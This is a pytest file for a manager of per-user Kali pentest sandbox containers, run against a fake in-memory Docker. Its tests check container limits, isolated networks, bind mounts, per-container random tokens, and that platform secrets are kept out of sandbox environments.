"""
Per-user Kali sandboxes: start, stop, reconcile and adoption (group 1).

The manager is driven against an in-memory Docker (FakeDocker below: containers,
networks, images and the raw network-connect call, with labels, health and
attrs shaped like the daemon's) and a real ReservationLedger with injected
memory. KALI_SANDBOX_MODE, the switch per-user sandboxes had before the shared
container went, is unset by the `env` fixture; a test sets it only to show it
changes nothing.

Host paths and the orchestrator's own paths differ on purpose: Docker gets the
host bases, the folders are made through the local ones (FakeDocker maps one
onto the other only to check that a bind source exists, as `--mount` does).

The lease and idle-loop tests reuse FakeDocker, the `world` fixture and the
helpers of this file.
"""
import asyncio
import json
import logging
import os
import stat

import pytest
from docker.errors import APIError, ImageNotFound, NotFound

import admission_ledger as al
import resource_governor as rg
import sandbox_contract as sc
import sandbox_manager as sm
from admission_ledger import ReservationLedger

GB = 1024 ** 3
IMAGE_ID = "sha256:" + "a" * 64
OTHER_IMAGE_ID = "sha256:" + "b" * 64
IMAGE_ENV = ("PATH=/usr/local/bin:/usr/bin:/bin", "LANG=C.UTF-8")
IMAGE_ENTRYPOINT = ["/opt/entrypoint.sh"]
# What `docker compose build` stamps on the Kali image, and every container
# started from it inherits unless it overrides them.
IMAGE_LABELS = {sc.COMPOSE_PROJECT_LABEL: "redamon", sc.COMPOSE_SERVICE_LABEL: "kali-sandbox"}
BROKER = "redamon.broker-owned"
PROXY_IMAGE = "redamon-capture-proxy:latest"
PROXY_IMAGE_ID = "sha256:" + "d" * 64
# The proxy's command as container_manager.start_capture_proxy and compose run it.
PROXY_CMD = ["mitmdump", "--quiet", "--set", "confdir=/ca", "--set", "connection_strategy=lazy",
             "--set", "stream_large_bodies=5m", "--set", "rawtcp=false", "--listen-port", "8888",
             "-s", "/app/capture_addon.py"]
ALICE = "alice-user-0001"
BOB = "bob-user-0002"
CAROL = "carol-user-0003"


# --- FakeDocker -------------------------------------------------------------------

class FakeResponse:
    def __init__(self, status_code, text=""):
        self.status_code = status_code
        self.text = text


class FakeImage:
    def __init__(self, image_id, env=IMAGE_ENV, entrypoint=IMAGE_ENTRYPOINT, labels=None):
        self.id = image_id
        self.attrs = {"Id": image_id, "Config": {
            "Env": list(env), "Entrypoint": list(entrypoint), "Cmd": None, "User": "",
            "Labels": dict(IMAGE_LABELS if labels is None else labels)}}


class FakeImages:
    """Tags point at images; an untagged image stays reachable by id while a
    container uses it, as on the daemon after a rebuild."""

    def __init__(self, d):
        self.d = d
        self.by_name = {sc.IMAGE: FakeImage(IMAGE_ID), PROXY_IMAGE: FakeImage(PROXY_IMAGE_ID, labels={})}
        self.by_id = {IMAGE_ID: self.by_name[sc.IMAGE], PROXY_IMAGE_ID: self.by_name[PROXY_IMAGE]}

    def add(self, image, tag=None):
        self.by_id[image.id] = image
        if tag:
            self.by_name[tag] = image
        return image

    def get(self, name):
        self.d.calls.append(("images.get", name))
        if name in self.by_name:
            return self.by_name[name]
        if name in self.by_id:
            return self.by_id[name]
        raise ImageNotFound(f"no image {name}")


class FakeContainer:
    def __init__(self, d, cid, name, attrs):
        self.d = d
        self.id = cid
        self.name = name
        self._attrs = attrs
        self.removed = False
        self.created_kwargs = None
        self.mounted = {}

    @property
    def attrs(self):
        return self._attrs

    @property
    def labels(self):
        return self._attrs["Config"]["Labels"]

    @property
    def status(self):
        return self._attrs["State"]["Status"]

    def env(self):
        return dict(e.partition("=")[::2] for e in self._attrs["Config"]["Env"])

    def _check(self):
        if self.removed:
            raise NotFound(f"no container {self.name}")

    def reload(self):
        self.d.calls.append(("container.reload", self.name))
        self._check()

    def start(self):
        self.d.calls.append(("container.start", self.name))
        self._check()
        for hook in list(self.d.on_start):
            hook(self)
        if self.d.fail_start:
            raise APIError(self.d.fail_start, explanation=self.d.fail_start)
        # Docker resolves each bind source here, following a link: what the
        # container sees from now on is whatever the path pointed at this moment.
        self.mounted = {}
        for m in self._attrs["HostConfig"]["Mounts"] or []:
            if m["Type"] == "bind":
                st = os.stat(self.d.local_of(m["Source"]))
                self.mounted[m["Target"]] = f"{st.st_dev}:{st.st_ino}"
        self._attrs["State"]["Status"] = "running"
        self._attrs["State"]["Health"] = {"Status": self.d.health_on_start}
        net = self._attrs["HostConfig"]["NetworkMode"]
        if net:
            self.d.networks.get(net)._attach(self, {})
        for hook in list(self.d.after_start):
            hook(self)

    def exec_run(self, cmd, **kw):
        self.d.calls.append(("container.exec", self.name, tuple(cmd)))
        self._check()
        if self.d.fail_exec or self.status != "running":
            raise APIError("exec failed", explanation="container is not running")
        assert list(cmd[:3]) == ["stat", "-c", "%d:%i"], cmd
        lines, code = [], 0
        for target in cmd[3:]:
            if target in self.mounted:
                lines.append(self.mounted[target])
            else:
                code = 1
        return (code, ("\n".join(lines) + "\n").encode())

    def kill(self, signal=None):
        self.d.calls.append(("container.kill", self.name))
        self._check()
        self._attrs["State"]["Status"] = "exited"

    def stop(self, timeout=None):
        self.d.calls.append(("container.stop", self.name, timeout))
        self._check()
        self._attrs["State"]["Status"] = "exited"

    def remove(self, force=False):
        self.d.calls.append(("container.remove", self.name, force))
        self._check()
        if self.d.fail_remove:
            raise APIError("removal failed", explanation="removal failed")
        self.removed = True
        for net in list(self.d.networks.items.values()):
            net._detach(self.id)


class FakeContainers:
    def __init__(self, d):
        self.d = d
        self.items = {}

    def live(self):
        return [c for c in self.items.values() if not c.removed]

    def add(self, name, labels=None, env=(), sysctls=None, status="running", image="other:latest",
            image_id="sha256:" + "c" * 64):
        cid = self.d.new_id()
        attrs = {
            "Id": cid, "Name": "/" + name, "Image": image_id,
            "Config": {"Image": image, "Env": list(env), "Labels": dict(labels or {}),
                       "Hostname": name, "Entrypoint": None, "Cmd": None, "User": ""},
            "HostConfig": {"Sysctls": dict(sysctls) if sysctls is not None else None,
                           "NetworkMode": "bridge", "Mounts": None, "Binds": None},
            "State": {"Status": status}, "NetworkSettings": {"Networks": {}}}
        c = FakeContainer(self.d, cid, name, attrs)
        self.items[cid] = c
        return c

    def create(self, image, command=None, **kw):
        name = kw.get("name")
        self.d.calls.append(("containers.create", name))
        self.d.created.append(kw)
        if self.d.fail_create:
            raise APIError(self.d.fail_create, explanation=self.d.fail_create)
        img = self.d.images.get(image)
        if any(c.name == name for c in self.live()):
            raise APIError(f"Conflict. The container name {name} is already in use")
        for m in kw.get("mounts") or []:
            if m["Type"] == "bind" and not os.path.isdir(self.d.local_of(m["Source"])):
                raise APIError(f"invalid mount config: bind source path does not exist: {m['Source']}")
        env = dict(e.partition("=")[::2] for e in img.attrs["Config"]["Env"])
        env.update(kw.get("environment") or {})
        labels = dict(img.attrs["Config"]["Labels"])
        labels.update(kw.get("labels") or {})
        ports = kw.get("ports") or {}
        cid = self.d.new_id()
        attrs = {
            "Id": cid, "Name": "/" + name, "Image": img.id,
            "Config": {"Image": image, "Env": [f"{k}={v}" for k, v in env.items()],
                       "Labels": labels, "Hostname": kw.get("hostname"),
                       "Entrypoint": img.attrs["Config"]["Entrypoint"], "Cmd": None,
                       "User": "", "Healthcheck": kw.get("healthcheck")},
            "HostConfig": {
                "Mounts": [dict(m) for m in kw.get("mounts") or []], "Binds": None,
                "VolumesFrom": None, "Devices": None, "NetworkMode": kw.get("network"),
                "CapAdd": list(kw.get("cap_add") or []), "SecurityOpt": list(kw.get("security_opt") or []),
                "Privileged": False, "PidMode": "", "IpcMode": "private", "UTSMode": "", "UsernsMode": "",
                "CgroupnsMode": "private", "Runtime": "runc", "PublishAllPorts": False,
                # docker-py sends a dict as "name:ip" strings; the daemon keeps them verbatim.
                "ExtraHosts": [f"{k}:{v}" for k, v in sorted((kw.get("extra_hosts") or {}).items())] or None,
                "DeviceCgroupRules": None, "ShmSize": 67108864,
                "Memory": kw.get("mem_limit"), "MemorySwap": kw.get("memswap_limit"),
                "PidsLimit": kw.get("pids_limit"), "NanoCpus": kw.get("nano_cpus"),
                "CpuShares": kw.get("cpu_shares"), "Dns": list(kw.get("dns") or []),
                "RestartPolicy": dict(kw.get("restart_policy") or {}),
                "PortBindings": {k: [{"HostIp": ip, "HostPort": str(p)}] for k, (ip, p) in ports.items()} or None,
                "Sysctls": None, "Init": kw.get("init")},
            "State": {"Status": "created", "Health": {"Status": "starting"}},
            "NetworkSettings": {"Networks": {}}}
        c = FakeContainer(self.d, cid, name, attrs)
        c.created_kwargs = kw
        self.items[cid] = c
        for hook in list(self.d.on_create):
            hook(c)
        return c

    def get(self, ref):
        self.d.calls.append(("containers.get", ref))
        for c in self.live():
            if ref in (c.id, c.name):
                return c
        raise NotFound(f"no container {ref}")

    def list(self, all=False, filters=None, **kw):
        self.d.calls.append(("containers.list", json.dumps(filters, sort_keys=True)))
        filters = filters or {}
        wanted = filters.get("label", [])
        wanted = [wanted] if isinstance(wanted, str) else wanted
        out = []
        for c in self.live():
            if not all and c.status != "running":
                continue
            ok = True
            for w in wanted:
                k, sep, v = w.partition("=")
                if (c.labels.get(k) != v) if sep else (k not in c.labels):
                    ok = False
            if ok:
                out.append(c)
        return out


class FakeNetwork:
    def __init__(self, d, nid, name, subnet, labels=None, driver="bridge", internal=False):
        self.d = d
        self.id = nid
        self.name = name
        self.removed = False
        self.endpoints = {}
        self.attrs = {"Id": nid, "Name": name, "Driver": driver, "Internal": internal,
                      "Labels": dict(labels or {}),
                      "IPAM": {"Config": [{"Subnet": subnet, "Gateway": None}] if subnet else []},
                      "Containers": {}}

    def _attach(self, container, endpoint_config):
        self.endpoints[container.id] = dict(endpoint_config)
        self.attrs["Containers"][container.id] = {"Name": container.name}
        container.attrs["NetworkSettings"]["Networks"][self.name] = {"Aliases": endpoint_config.get("Aliases")}

    def _detach(self, cid):
        self.endpoints.pop(cid, None)
        self.attrs["Containers"].pop(cid, None)
        c = self.d.containers.items.get(cid)
        if c:
            c.attrs["NetworkSettings"]["Networks"].pop(self.name, None)

    def reload(self):
        self.d.calls.append(("network.reload", self.name))
        if self.removed:
            raise NotFound(f"no network {self.name}")

    def disconnect(self, container, force=False):
        cid = getattr(container, "id", container)
        self.d.calls.append(("network.disconnect", self.name, cid, force))
        self._detach(cid)

    def remove(self):
        self.d.calls.append(("network.remove", self.name))
        if self.d.fail_network_remove:
            raise APIError("network remove failed")
        if self.attrs["Containers"]:
            raise APIError(f"error while removing network: network {self.name} has active endpoints")
        self.removed = True


class FakeNetworks:
    def __init__(self, d):
        self.d = d
        self.items = {}

    def live(self):
        return [n for n in self.items.values() if not n.removed]

    def add(self, name, subnet, labels=None):
        n = FakeNetwork(self.d, self.d.new_id(), name, subnet, labels)
        self.items[n.id] = n
        return n

    def create(self, name, driver=None, options=None, ipam=None, check_duplicate=None,
               internal=False, labels=None, **kw):
        self.d.calls.append(("networks.create", name))
        if any(n.name == name for n in self.live()):
            raise APIError(f"network with name {name} already exists")
        subnet = ipam["Config"][0]["Subnet"]
        n = FakeNetwork(self.d, self.d.new_id(), name, subnet, labels, driver or "bridge", internal)
        n.attrs["IPAM"]["Config"][0]["Gateway"] = ipam["Config"][0]["Gateway"]
        self.items[n.id] = n
        return n

    def get(self, ref, **kw):
        self.d.calls.append(("networks.get", ref))
        for n in self.live():
            if ref in (n.id, n.name):
                return n
        raise NotFound(f"no network {ref}")

    def list(self, filters=None, **kw):
        self.d.calls.append(("networks.list", json.dumps(filters, sort_keys=True)))
        wanted = (filters or {}).get("label", [])
        wanted = [wanted] if isinstance(wanted, str) else wanted
        out = []
        for n in self.live():
            labels = n.attrs["Labels"]
            if all((labels.get(k) == v) if s else (k in labels)
                   for k, s, v in (w.partition("=") for w in wanted)):
                out.append(n)
        return out


class FakeAPI:
    """The low-level client: only the raw network connect the manager sends."""

    def __init__(self, d):
        self.d = d
        self.api_version = "1.57"

    def _url(self, pathfmt, *args, **kw):
        return pathfmt.format(*args)

    def post(self, url, data=None, headers=None, **kw):
        parts = url.strip("/").split("/")
        assert parts[0] == "networks" and parts[2] == "connect", url
        body = json.loads(data)
        self.d.connects.append((parts[1], body))
        self.d.calls.append(("network.connect", parts[1], body["Container"]))
        net = self.d.networks.get(parts[1])
        c = self.d.containers.get(body["Container"])
        if c.id in net.endpoints:
            return FakeResponse(403, f"endpoint with name {c.name} already exists in network {net.name}")
        net._attach(c, body.get("EndpointConfig") or {})
        return FakeResponse(200)

    def _raise_for_status(self, res):
        if res.status_code >= 400:
            raise APIError(res.text, explanation=res.text)


class FakeDocker:
    def __init__(self):
        self.calls = []
        self.created = []
        self.connects = []
        self.on_create = []
        self.on_start = []
        self.after_start = []
        self.health_on_start = "healthy"
        self.fail_create = None
        self.fail_start = None
        self.fail_exec = False
        self.fail_remove = False
        self.fail_network_remove = False
        self.cgroup_version = "2"
        self.host_to_local = {}
        self._next = 0
        self.containers = FakeContainers(self)
        self.networks = FakeNetworks(self)
        self.images = FakeImages(self)
        self.api = FakeAPI(self)

    def new_id(self):
        self._next += 1
        return f"{self._next:064x}"

    def version(self):
        return {"Version": "29.10.0", "ApiVersion": self.api.api_version}

    def info(self):
        return {"CgroupVersion": self.cgroup_version, "DefaultRuntime": "runc"}

    def local_of(self, host_path):
        for host, local in self.host_to_local.items():
            if host_path == host or host_path.startswith(host + "/"):
                return local + host_path[len(host):]
        return host_path

    # Calls that change Docker's state (what a refused request must never reach).
    def mutations(self):
        verbs = ("containers.create", "container.start", "container.remove", "networks.create",
                 "network.connect", "network.remove", "network.disconnect")
        return [c for c in self.calls if c[0] in verbs]

    def sandbox_containers(self):
        return [c for c in self.containers.live() if c.labels.get(sc.LABEL_SANDBOX) == "1"]

    def sandbox_networks(self):
        return [n for n in self.networks.live() if n.attrs["Labels"].get(sc.LABEL_SANDBOX) == "1"]


GUEST_SYSCTLS = dict(sc.GUEST_SYSCTLS)
ONEOFF = "com.docker.compose.oneoff"
CONFIG_HASH = "com.docker.compose.config-hash"
CONTAINER_NUMBER = "com.docker.compose.container-number"
# What `docker compose build` stamps on the agent image (as `docker image
# inspect redamon-agent` shows it): a plain `docker run redamon-agent ...` (a
# unit gate, run_tests.sh, a one-file test command) inherits exactly these.
AGENT_IMAGE_LABELS = {sc.COMPOSE_PROJECT_LABEL: "redamon", sc.COMPOSE_SERVICE_LABEL: "agent",
                      "com.docker.compose.version": "5.7.2"}
# What compose adds on a service container it creates, and never on an image.
COMPOSE_CONTAINER_LABELS = {CONFIG_HASH: "e" * 64, CONTAINER_NUMBER: "1", ONEOFF: "False"}


def add_agent(d, sysctls=GUEST_SYSCTLS, project="redamon", name="redamon-agent", labels=None, number=1):
    """The agent as compose creates it: the image's labels plus its own."""
    base = {**AGENT_IMAGE_LABELS, **COMPOSE_CONTAINER_LABELS,
            sc.COMPOSE_PROJECT_LABEL: project, CONTAINER_NUMBER: str(number)}
    base.update(labels or {})
    return d.containers.add(name, labels=base, sysctls=sysctls, image="redamon-agent:latest")


def add_agent_lookalike(d, name="pensive_turing", sysctls=None, labels=None):
    """`docker run redamon-agent ...`: a random name and the image's labels only."""
    return d.containers.add(name, labels={**AGENT_IMAGE_LABELS, **(labels or {})}, sysctls=sysctls,
                            image="redamon-agent:latest")


def add_proxy(d, sysctls=GUEST_SYSCTLS, blocked="172.18.0.5," + sc.SUBNET_POOL,
              image_id=PROXY_IMAGE_ID, cmd=PROXY_CMD):
    """The capture proxy as the orchestrator starts it: the current proxy image,
    no forwarding, the pool in its denylist, raw TCP relaying off."""
    proxy = d.containers.add(sc.CAPTURE_PROXY_NAME, labels={"redamon.capture": "proxy"},
                             sysctls=sysctls, env=[f"CAPTURE_BLOCKED_IPS={blocked}"],
                             image=PROXY_IMAGE, image_id=image_id)
    proxy.attrs["Config"]["Cmd"] = None if cmd is None else list(cmd)
    return proxy


# --- The world: manager, ledger, folders ------------------------------------------

class Clock:
    def __init__(self, now=1_800_000_000.0):
        self.now = now

    def __call__(self):
        return self.now


class Host:
    """Injected host memory: 16 GiB total, 15 GiB free, 1 GiB headroom, 1 GiB baseline."""

    def __init__(self):
        self.mem = (16 * GB, 15 * GB)
        self.pressure = "none"


async def fast_sleep(_seconds):
    await asyncio.sleep(0)


HOST_ROOT = "/srv/redamon"
HOST_BASES = {
    sc.MOUNT_WORKSPACE: f"{HOST_ROOT}/agentic/agent-workspace",
    sc.MOUNT_OUTPUT: f"{HOST_ROOT}/mcp/output",
    sc.MOUNT_SERVERS: f"{HOST_ROOT}/mcp/servers",
    sc.MOUNT_GRAPH_DB: f"{HOST_ROOT}/graph_db",
    sc.MOUNT_CUSTOM_TEMPLATES: f"{HOST_ROOT}/mcp/nuclei-templates",
}


class World:
    def __init__(self, tmp_path, monkeypatch):
        self.mp = monkeypatch
        self.d = FakeDocker()
        self.agent = add_agent(self.d)
        self.proxy = add_proxy(self.d)
        self.d.networks.add("redamon-network", "172.18.0.0/16")
        self.d.networks.add("redamon_pentest-net", "172.19.0.0/16")
        self.local = {}
        for kind, host in HOST_BASES.items():
            path = tmp_path / kind
            path.mkdir()
            self.local[kind] = str(path)
            self.d.host_to_local[host] = str(path)
        (tmp_path / sc.MOUNT_SERVERS / "network_recon_server.py").write_text("x = 1\n")
        (tmp_path / sc.MOUNT_CUSTOM_TEMPLATES / "custom.yaml").write_text("id: c\n")
        self.host = Host()
        self.ledger = ReservationLedger(mem_reader=lambda: self.host.mem,
                                        pressure_fn=lambda: self.host.pressure)
        self.clock = Clock()
        self.mgr = self.manager()

    def manager(self, own_compose_project="redamon", **kw):
        args = dict(clock=self.clock, cpu_count=lambda: 12, local_bases=self.local,
                    sleep=fast_sleep, start_timeout_s=3)
        args.update(kw)
        return sm.SandboxManager(self.d, self.ledger, dict(HOST_BASES), "redamon-osv-db",
                                 own_compose_project, **args)

    def ws(self, *parts):
        return os.path.join(self.local[sc.MOUNT_WORKSPACE], *parts)

    def out(self, *parts):
        return os.path.join(self.local[sc.MOUNT_OUTPUT], *parts)

    def created(self, user_id=None, view=sc.VIEW_OWN):
        cs = self.d.sandbox_containers()
        if user_id is not None:
            cs = [c for c in cs if c.labels.get(sc.LABEL_KEY) == sc.sandbox_key(user_id, view)]
        return cs


class Gate:
    """A sleep that holds a start's health polling until the test opens it."""

    def __init__(self):
        self.event = asyncio.Event()

    async def sleep(self, _seconds):
        await self.event.wait()

    def open(self):
        self.event.set()


@pytest.fixture
def env(monkeypatch, tmp_path):
    for name in ("RECON_MAX_CONCURRENT_GLOBAL", "RECON_MAX_CONCURRENT_PER_USER",
                 sc.MAX_CONCURRENT_ENV, sc.PORT_POOL_ENV, sc.IDLE_MINUTES_ENV, sc.PORT_HOLD_HOURS_ENV,
                 sc.TERMINAL_MAX_SESSIONS_ENV, "RESOURCE_PROFILE_DEFAULT_PATH", "KALI_SANDBOX_MODE",
                 "CAPTURE_PROXY_IMAGE"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("REDAMON_MEM_GOVERNOR", "true")
    monkeypatch.setenv("OS_HEADROOM_MEM", "1g")
    monkeypatch.setenv("SERVICE_BASELINE_MEM", "1g")
    monkeypatch.setenv("RESOURCE_PROFILE_PATH", str(tmp_path / "no-host-profile.json"))
    rg.reset_profile_cache()
    yield monkeypatch
    rg.reset_profile_cache()


@pytest.fixture
def world(tmp_path, env):
    w = World(tmp_path, env)
    yield w


async def settle(n=20):
    for _ in range(n):
        await asyncio.sleep(0)


def env_of(container):
    return container.env()


# --- Start ------------------------------------------------------------------------

async def test_ensure_starts_one_container_per_user(world):
    ans = await world.mgr.ensure(ALICE, ["projA"])
    assert set(ans) == set(sc.ENSURE_RUNNING_KEYS) | set(sc.ENSURE_RUNNING_OPTIONAL_KEYS)
    assert ans["reverse_port_state"] == sc.REVERSE_PORT_NO_POOL
    assert "mode" not in ans and ans["state"] == "running" and ans["fresh"] is True
    assert ans["view"] == sc.VIEW_OWN and ans["projects"] == ["projA"]
    assert ans["ports"] == dict(sc.PORTS) and ans["reverse_port"] == sc.DEFAULT_REVERSE_PORT
    assert ans["host"] == sc.container_name(ALICE, sc.VIEW_OWN, ans["instance"])
    assert [c.name for c in world.created()] == [ans["host"]]

    again = await world.mgr.ensure(ALICE, ["projA"])
    assert again["instance"] == ans["instance"] and again["fresh"] is False
    assert again["token"] == ans["token"]
    assert len(world.created()) == 1
    assert world.mgr.reservation_keys() == {sc.reservation_key(ALICE, ans["instance"])}
    assert world.ledger.sandbox_keys() == {sc.reservation_key(ALICE, ans["instance"])}


async def test_two_users_get_two_containers(world):
    a = await world.mgr.ensure(ALICE, ["projA", "shared1"])
    b = await world.mgr.ensure(BOB, ["shared1"])
    assert a["host"] != b["host"] and a["token"] != b["token"]
    assert a["tunnel_token"] != b["tunnel_token"]
    nets = {c.attrs["HostConfig"]["NetworkMode"] for c in world.created()}
    assert nets == {sc.network_name(ALICE, "own"), sc.network_name(BOB, "own")}
    bob = world.created(BOB)[0]
    targets = {m["Target"] for m in bob.created_kwargs["mounts"]}
    assert "/workspace/shared1" in targets and "/workspace/projA" not in targets
    assert env_of(bob)[sc.ENV_SANDBOX_KEY] == sc.sandbox_key(BOB, "own")
    assert len(world.ledger.sandbox_keys()) == 2


async def test_concurrent_ensure_same_user_one_start(world):
    answers = await asyncio.gather(*(world.mgr.ensure(ALICE, ["projA"]) for _ in range(5)))
    assert len({a["instance"] for a in answers}) == 1
    assert sum(a["fresh"] for a in answers) == 1
    assert len([c for c in world.d.calls if c[0] == "containers.create"]) == 1
    assert len(world.ledger.sandbox_keys()) == 1


async def test_container_spec_limits_per_container(world):
    await world.mgr.ensure(ALICE, ["projA"])
    kw = world.created(ALICE)[0].created_kwargs
    assert world.created(ALICE)[0].attrs["Config"]["Image"] == sc.IMAGE
    assert kw["mem_limit"] == GB and kw["memswap_limit"] == GB
    assert kw["pids_limit"] == sc.PIDS_LIMIT == 4096
    assert kw["nano_cpus"] == 4 * 10 ** 9            # 12 cores // 2, capped at 4
    # A CPU weight below the services' default 1024: many sandboxes' fork bombs
    # yield to the platform's services under contention (D22).
    assert 0 < kw["cpu_shares"] < 1024
    assert kw["restart_policy"] == {"Name": "no"}
    # Docker's init as PID 1 reaps orphaned processes, which would otherwise stay
    # zombies and count against the pids limit for the sandbox's whole life.
    assert kw["init"] is True and world.created(ALICE)[0].attrs["HostConfig"]["Init"] is True
    assert sorted(kw["cap_add"]) == ["NET_ADMIN", "NET_RAW"]
    assert "cap_drop" not in kw
    assert kw["security_opt"] == ["seccomp=unconfined"]
    assert not any("no-new-privileges" in o for o in kw["security_opt"])
    assert "privileged" not in kw and "devices" not in kw and "volumes" not in kw
    # Docker makes the hostname a DNS name on the sandbox network, which the agent and
    # the proxy join: each sandbox's is its own container name, never a shared one.
    # Inside, `kali-sandbox` (what tools and prompts call the sandbox) is itself.
    created = world.created(ALICE)[0]
    assert kw["hostname"] == created.name == created.attrs["Config"]["Hostname"]
    assert kw["hostname"] != sc.SELF_NAME == "kali-sandbox"
    assert kw["extra_hosts"] == {"kali-sandbox": "127.0.0.1"}
    assert created.attrs["HostConfig"]["ExtraHosts"] == ["kali-sandbox:127.0.0.1"]
    assert kw["dns"] == list(sc.DNS)
    hc = kw["healthcheck"]
    assert hc["test"] == ["CMD", "python3", "-c", sc.HEALTH_PROBE]
    assert hc["interval"] == 2 * 10 ** 9 and hc["timeout"] == 2 * 10 ** 9 and hc["retries"] == 3
    assert hc["start_period"] == sc.START_TIMEOUT_S * 10 ** 9
    # The compose labels the image inherits are blanked, so `docker compose up`
    # never counts a sandbox as a surplus kali-sandbox replica and removes it.
    labels = world.created(ALICE)[0].labels
    assert labels[sc.COMPOSE_PROJECT_LABEL] == "" and labels[sc.COMPOSE_SERVICE_LABEL] == ""
    assert labels[sm.LABEL_OWNER] == "redamon"
    assert labels[sc.LABEL_SANDBOX] == "1" and labels[sc.LABEL_CONTRACT] == "1"
    assert labels[sc.LABEL_USER] == ALICE and labels[sc.LABEL_VIEW] == "own"
    assert labels[sc.LABEL_PROJECTS] == sc.projects_hash(["projA"])
    assert labels[sc.LABEL_SERVERS] == sc.servers_fingerprint(world.local[sc.MOUNT_SERVERS])
    assert labels[sc.LABEL_PORT] == ""
    assert "ports" not in kw or not kw["ports"]


async def test_cpu_count_one_gives_one_cpu(world):
    mgr = world.manager(cpu_count=lambda: 1)
    await mgr.ensure(ALICE, [])
    assert world.created(ALICE)[0].created_kwargs["nano_cpus"] == 10 ** 9


async def test_container_not_on_shared_networks(world):
    await world.mgr.ensure(ALICE, ["projA"])
    c = world.created(ALICE)[0]
    assert c.created_kwargs["network"] == sc.network_name(ALICE, "own")
    assert "network_mode" not in c.created_kwargs and "networking_config" not in c.created_kwargs
    assert set(c.attrs["NetworkSettings"]["Networks"]) == {sc.network_name(ALICE, "own")}
    net = world.d.networks.get(sc.network_name(ALICE, "own"))
    assert net.attrs["Driver"] == "bridge" and net.attrs["Internal"] is False
    assert net.attrs["Labels"] == {**sc.network_labels(ALICE, "own"), sm.LABEL_OWNER: "redamon"}
    subnet = net.attrs["IPAM"]["Config"][0]["Subnet"]
    assert subnet.startswith("10.214.") and subnet.endswith("/28")
    assert net.attrs["IPAM"]["Config"][0]["Gateway"] == sc.gateway_for(subnet)
    for shared in ("redamon-network", "redamon_pentest-net"):
        assert c.id not in world.d.networks.get(shared).attrs["Containers"]


async def test_subnet_skips_a_used_one(world):
    world.d.networks.add("lab", "10.214.0.0/28")
    await world.mgr.ensure(ALICE, [])
    net = world.d.networks.get(sc.network_name(ALICE, "own"))
    assert net.attrs["IPAM"]["Config"][0]["Subnet"] == "10.214.0.16/28"


async def test_mounts_are_the_contract_plan(world):
    await world.mgr.ensure(ALICE, ["projB", "projA"], custom_templates=["custom.yaml"])
    mounts = world.created(ALICE)[0].created_kwargs["mounts"]
    got = sorted((m["Type"], m["Source"], m["Target"], m["ReadOnly"]) for m in mounts)
    key = sc.sandbox_key(ALICE, "own")
    expected = sorted([
        ("bind", f"{HOST_BASES['workspace']}/projA", "/workspace/projA", False),
        ("bind", f"{HOST_BASES['workspace']}/projB", "/workspace/projB", False),
        ("bind", f"{HOST_BASES['output']}/users/{key}", "/opt/output", False),
        ("bind", HOST_BASES["servers"], "/opt/mcp_servers", True),
        ("bind", HOST_BASES["graph_db"], "/opt/graph_db", True),
        ("bind", f"{HOST_BASES['output']}/templates/{key}", "/opt/nuclei-templates", True),
        ("volume", sc.TEMPLATES_VOLUME, "/root/nuclei-templates", True),
        ("volume", "redamon-osv-db", "/osv-db", True),
    ])
    assert got == expected
    for _, source, target, _ in got:
        assert target != "/workspace" and ".staging" not in source + target
        assert "docker.sock" not in source + target
        assert source not in (HOST_BASES["workspace"], HOST_BASES["custom_templates"])


async def test_empty_custom_templates_folder_is_not_mounted(world):
    os.remove(os.path.join(world.local[sc.MOUNT_CUSTOM_TEMPLATES], "custom.yaml"))
    await world.mgr.ensure(ALICE, [], custom_templates=["custom.yaml"])
    targets = {m["Target"] for m in world.created(ALICE)[0].created_kwargs["mounts"]}
    assert sc.CUSTOM_TEMPLATES_TARGET not in targets
    assert sc.OUTPUT_TARGET in targets and not any(t.startswith("/workspace") for t in targets)


async def test_missing_custom_templates_folder_does_not_block_a_start(world, tmp_path):
    local = dict(world.local)
    local[sc.MOUNT_CUSTOM_TEMPLATES] = str(tmp_path / "absent")
    mgr = world.manager(local_bases=local)
    assert (await mgr.ensure(ALICE, [], custom_templates=["custom.yaml"]))["state"] == "running"
    targets = {m["Target"] for m in world.created(ALICE)[0].created_kwargs["mounts"]}
    assert sc.CUSTOM_TEMPLATES_TARGET not in targets


async def test_missing_servers_folder_refuses_the_start(world, tmp_path):
    local = dict(world.local)
    local[sc.MOUNT_SERVERS] = str(tmp_path / "absent")
    mgr = world.manager(local_bases=local)
    with pytest.raises(sm.SandboxStartError) as e:
        await mgr.ensure(ALICE, [])
    assert e.value.code == sc.ERR_START_FAILED
    assert world.created() == [] and world.ledger.sandbox_keys() == set()


async def test_tokens_are_random_per_container(world):
    a = await world.mgr.ensure(ALICE, [])
    b = await world.mgr.ensure(BOB, [])
    c = await world.mgr.ensure(ALICE, [], view=sc.VIEW_ACT_AS)
    tokens = [a["token"], a["tunnel_token"], b["token"], b["tunnel_token"], c["token"], c["tunnel_token"]]
    assert len(set(tokens)) == 6
    for t in tokens:
        assert len(t) == 43
    env = env_of(world.created(ALICE)[0])
    assert env[sc.ENV_MCP_AUTH_TOKEN] == a["token"] and env[sc.ENV_TUNNEL_AUTH_TOKEN] == a["tunnel_token"]


PLATFORM_SECRETS = ("INTERNAL_API_KEY", "SCANNER_API_KEY", "NEO4J_PASSWORD", "AUTH_SECRET",
                    "TRAFFIC_INGEST_DATABASE_URL", "PLUGIN_RUNNER_KEY", "NEO4J_AUTH",
                    "PGPASSWORD", "ADMIN_PASSWORD", "DATABASE_URL", "NGROK_AUTHTOKEN")


@pytest.mark.parametrize("terminal_max", [None, "7"])
async def test_env_has_no_platform_secret(world, terminal_max):
    for i, name in enumerate(PLATFORM_SECRETS):
        world.mp.setenv(name, f"platform-secret-{i}")
    if terminal_max:
        world.mp.setenv(sc.TERMINAL_MAX_SESSIONS_ENV, terminal_max)
    await world.mgr.ensure(ALICE, ["projA"])
    sent = world.created(ALICE)[0].created_kwargs["environment"]
    # The allowlist is what protects: exactly the contract's keys, nothing else.
    expected = set(sc.CONTAINER_ENV_FIXED) | {sc.ENV_MCP_AUTH_TOKEN, sc.ENV_TUNNEL_AUTH_TOKEN,
                                              sc.ENV_SANDBOX_KEY, sc.ENV_REVERSE_PORT}
    if terminal_max:
        expected.add(sc.TERMINAL_MAX_SESSIONS_ENV)
    assert set(sent) == expected
    for k, v in sc.CONTAINER_ENV_FIXED.items():
        assert sent[k] == v
    for value in sent.values():
        assert "platform-secret" not in value and ALICE not in value
    assert sent[sc.ENV_REVERSE_PORT] == "4444"
    if terminal_max:
        assert sent[sc.TERMINAL_MAX_SESSIONS_ENV] == "7"


# --- Guests -----------------------------------------------------------------------

